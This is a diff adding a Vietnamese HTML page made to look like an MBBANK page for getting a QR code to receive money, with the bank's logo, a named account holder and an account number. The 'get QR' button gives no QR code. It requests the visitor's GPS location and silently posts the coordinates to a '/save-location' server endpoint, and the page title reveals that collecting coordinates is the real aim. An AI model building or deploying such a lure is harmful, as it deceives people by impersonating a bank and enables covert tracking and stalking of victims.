@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lấy Tọa Độ GPS</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        #coordinates {
+            margin-top: 20px;
+            font-size: 20px;
+            font-weight: bold;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <h1>MBBANK</h1> <img style="width: 200px;" src="https://play-lh.googleusercontent.com/eropcks-sakGkOkCHQzpd87FKK4efHTLY5b93H2FwNLjoPnPcAMSzOHsm3s6lguSgw" alt="">
+    <h1>Lấy Mã QR Nhận Tiền Từ MBBANK HOANG VAN MANH </h1>
+    <p>STK : 9300309309xxx</p>
+    <button onclick="getLocation()">Lấy QR</button>
+    <div id="coordinates"></div>
+
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                document.getElementById("coordinates").innerHTML = "Trình duyệt của bạn không hỗ trợ GPS.";
+            }
+        }
+    
+        function showPosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            document.getElementById("coordinates").innerHTML = `Vĩ độ: ${latitude} <br> Kinh độ: ${longitude}`;
+    
+            // Gửi dữ liệu GPS về máy chủ
+            sendLocationToServer(latitude, longitude);
+        }
+    
+        function sendLocationToServer(latitude, longitude) {
+            // Tạo đối tượng dữ liệu cần gửi
+            const data = {
+                latitude: latitude,
+                longitude: longitude
+            };
+    
+            // Sử dụng fetch để gửi dữ liệu qua POST
+            fetch('/save-location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Dữ liệu đã được gửi thành công:', data);
+            })
+            .catch(error => {
+                console.error('Có lỗi xảy ra khi gửi dữ liệu:', error);
+            });
+        }
+    
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    document.getElementById("coordinates").innerHTML = "Người dùng từ chối yêu cầu vị trí.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    document.getElementById("coordinates").innerHTML = "Vị trí không khả dụng.";
+                    break;
+                case error.TIMEOUT:
+                    document.getElementById("coordinates").innerHTML = "Lỗi thời gian chờ.";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    document.getElementById("coordinates").innerHTML = "Đã xảy ra lỗi không xác định.";
+                    break;
+            }
+        }
+    </script>
+    
+</body>
+</html>
